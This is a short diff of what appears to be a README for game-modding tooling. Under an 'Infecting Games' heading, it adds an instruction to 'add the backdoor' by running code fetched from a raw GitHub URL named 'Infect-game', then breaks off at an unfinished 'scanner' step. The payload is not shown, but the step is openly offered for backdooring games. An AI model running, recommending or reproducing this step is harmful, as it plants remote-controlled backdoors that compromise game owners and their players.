@@ -6,4 +6,8 @@ heres an image of it
 and yeah
 
 <h1>Infecting Games</h1>
-run ''''
+to add the backdoor run
+https://raw.githubusercontent.com/BabushkaBoosters/Mini-Krnl/refs/heads/main/Infect-game
+
+and loading the scanner run
+
